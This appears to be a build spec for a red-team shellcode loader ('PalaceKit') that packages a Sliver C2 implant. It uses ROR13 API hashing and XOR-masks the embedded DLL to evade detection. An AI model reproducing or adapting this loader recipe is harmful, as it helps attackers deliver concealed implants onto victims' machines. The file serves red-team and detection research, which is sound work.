x64:
    ; PalaceKit loader spec — Crystal Kit format for Sliver
    ;
    ; Unity build: all C sources are compiled into loader.x64.o via unity.c.
    ; This eliminates MinGW's .refptr / ADDR64 cross-TU relocs (incompatible
    ; with PIC shellcode — they require absolute runtime addresses).
    ;
    ; Named sections (dll, mask, pico) are located at runtime via 4-byte magic
    ; markers prepended by the spec evaluator. No COFF relocs target them.

    load "bin/loader.x64.o"
        make pic +gofirst +optimize

    dfr "resolve" "ror13"

    generate $MASK 128

    push $DLL
        xor $MASK
        preplen
        link "dll"

    push $MASK
        preplen
        link "mask"

    run "pico.spec"
        link "pico"

    export
